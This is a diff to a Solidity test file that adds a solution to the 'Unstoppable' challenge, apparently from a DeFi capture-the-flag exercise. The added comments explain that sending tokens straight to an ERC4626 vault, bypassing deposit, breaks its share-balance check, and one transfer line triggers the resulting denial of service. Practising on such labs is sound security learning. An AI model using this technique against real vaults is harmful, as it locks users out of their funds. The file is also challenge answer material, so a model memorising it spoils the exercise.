@@ -91,7 +91,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // The exploit is partially at if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+        // and the other part of the issue is that when we send erc20 (instead of of depositing with ERC4626::deposit
+        // function), it doesn't issue shares and the maths stop math-ing.
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
